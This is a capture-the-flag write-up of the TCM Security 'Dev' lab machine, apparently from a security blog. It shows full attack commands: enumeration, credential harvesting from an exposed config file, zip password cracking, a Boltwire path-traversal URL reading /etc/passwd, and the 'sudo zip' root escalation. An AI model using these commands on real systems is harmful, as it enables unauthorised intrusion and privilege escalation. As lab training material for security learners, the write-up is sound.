
# Dev — TCM Security PEH Capstone

**By Stager** | FashilHack

---
## What this machine taught me

Dev is the kind of machine that makes you appreciate enumeration. Every service gave you one piece of the puzzle. The NFS share gave you a key. The config file gave you a password. The web app gave you the username. None of them alone were enough — you had to put them all together.

I'll be honest: I got stuck on the username. I found `jp` in the todo.txt, tried it, tried `bolt`, tried `root` — none worked. The full username `jeanpaul` was sitting in `/etc/passwd` the whole time, accessible via a file inclusion vulnerability in Boltwire on port 8080. I found that through the writeup after spending time on it. I'm documenting it here because that's the step worth learning.

---

## Target

```
IP:  172.20.10.5
OS:  Debian Linux
```

---

## Step 1 — Nmap

```bash
nmap -p- -A -T4 172.20.10.5
```

|Port|Service|
|---|---|
|22|SSH|
|80|HTTP — Apache, Bolt CMS error page|
|111|RPC|
|2049|NFS|
|8080|HTTP — PHP info page|

Three things worth attacking: port 80 web app, port 8080 web app, and NFS on 2049. I started with the web apps and NFS in parallel.

![Nmap Results](./images/nmap.png)

---

## Step 2 — Gobuster on Both Ports

```bash
gobuster dir -u http://172.20.10.5 -w big.txt -x php,html,txt
gobuster dir -u http://172.20.10.5:8080 -w big.txt -x php,html,txt
```

Port 80 gave me `/app`, `/src`, `/public` — Bolt CMS directories. The `/app` directory was open to browse without any login.

Port 8080 gave me `/dev` — Boltwire CMS running inside.
![Nmap Results](./images/dirbuster.png)


---

## Step 3 — config.yml — Credentials in the Open

Inside `/app/config/` on port 80 was `config.yml`. No authentication required to read it.

```
http://172.20.10.5/app/config/config.yml
```

Contents:

```yaml
database:
  driver: sqlite
  username: bolt
  password: I_love_java
```

Credentials noted. `I_love_java` went straight into my notes as a password to try everywhere.

![[stager/writeups/Dev/images/found database creds.png]]

---

## Step 4 — NFS Enumeration

Port 111 and 2049 together mean NFS. First step — check what's being shared:

```bash
showmount -e 172.20.10.5
```

Output:

```
/srv/nfs  172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
```

The share is accessible from any private network range — which includes my lab. Mounted it:

```bash
sudo mkdir /mnt/nfs
sudo mount -t nfs -o vers=3 172.20.10.5:/srv/nfs /mnt/nfs
cd /mnt/nfs
ls
# save.zip
```

One file: a password-protected zip.
![Nmap Results](./images/nfs%20shared%20found%20mounted.png)


---

## Step 5 — Cracking save.zip

`unzip save.zip` asked for a password I didn't have. Ran `fcrackzip`:

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```

Output:

```
PASSWORD FOUND!!!!: pw == java101
```

![Nmap Results](./images/crack%20a%20zip%20file%20after%20we%20found%20i%20in%20rpcclient%20port%20111.png)


---

## Step 6 — What Was Inside the Zip

```bash
unzip save.zip
ls
# id_rsa    todo.txt

cat todo.txt
# - Figure out how to install the main website properly
# - Update development website
# - Keep coding in Java because it's awesome
# jp

cat id_rsa
# -----BEGIN OPENSSH PRIVATE KEY-----
```

Two useful things: an SSH private key and a note signed by `jp`. I assumed `jp` was the username. That assumption was wrong — or rather, incomplete.
![rsa found](./images/rsa%20found.png)

---

## Step 7 — Where I Got Stuck (And What the Answer Was)

I tried:

```bash
chmod 600 id_rsa
ssh -i id_rsa jp@172.20.10.5        # failed
ssh -i id_rsa bolt@172.20.10.5      # failed
ssh -i id_rsa root@172.20.10.5      # failed
```

The issue was I had the key but not the correct username. `jp` was initials — not the actual account name.

The answer was in Boltwire on port 8080. Boltwire has a known file inclusion vulnerability:

```
http://172.20.10.5:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```
This reads `/etc/passwd` from the server. Inside it:
```
jeanpaul:x:1000:1000:,,,:/home/jeanpaul:/bin/bash
```

`jeanpaul` — matching initials `jp`. That was the username the whole time.

**What I should have done:** After finding Boltwire in the `/dev` directory, I should have searched for known vulnerabilities immediately. File inclusion in Boltwire is documented and well known. It would have saved significant time.

---

## Step 8 — SSH as jeanpaul

```bash
ssh -i id_rsa jeanpaul@172.20.10.5
# Passphrase prompt: I_love_java
```

Worked. The passphrase for the key was the same password found in `config.yml`. Password reuse — the todo.txt even said "Keep coding in Java" which pointed directly at it.

---

## Step 9 — Root via sudo zip

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/zip
```

`jeanpaul` can run `zip` as root without a password. GTFOBins has the exact exploit:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

What this does: zip's `-TT` option lets you specify a script to test the archive. By passing `sh #` as the test script, you're telling zip to run a shell as root. The `#` comments out the rest of the command zip adds after it.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat flag.txt
```

Done.

---
## The Full Chain

```
Nmap → ports 22, 80, 111, 2049, 8080
    ↓
Gobuster port 80 → /app/config/config.yml → bolt:I_love_java
Gobuster port 8080 → /dev (Boltwire CMS)
    ↓
showmount → /srv/nfs accessible
Mount NFS → save.zip
    ↓
fcrackzip → java101 → unzip → id_rsa + todo.txt (jp)
    ↓
Boltwire file inclusion → /etc/passwd → jeanpaul
    ↓
ssh -i id_rsa jeanpaul@172.20.10.5 (I_love_java)
    ↓
sudo -l → sudo zip → GTFOBins → root
    ↓
/root/flag.txt
```

---

## What I took from this

**Check every service.** Port 8080 held the key to the username. I enumerated it, found the directory, but didn't push deep enough into what Boltwire could do. The habit to build: once you identify a CMS or application, immediately search for known vulnerabilities before moving to other things.

**Credential reuse is real.** `I_love_java` appeared in the database config, as the SSH key passphrase, and was hinted at in the todo note. One password, three places. In real assessments this happens constantly.

**`jp` wasn't wrong — it was incomplete.** The todo was a hint pointing toward the real username. The file inclusion is what confirmed it. Neither clue alone was enough.

**`sudo -l` before anything else on privesc.** It's one command and it tells you everything that user can run as root. `sudo zip` looks harmless. GTFOBins shows it's not.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._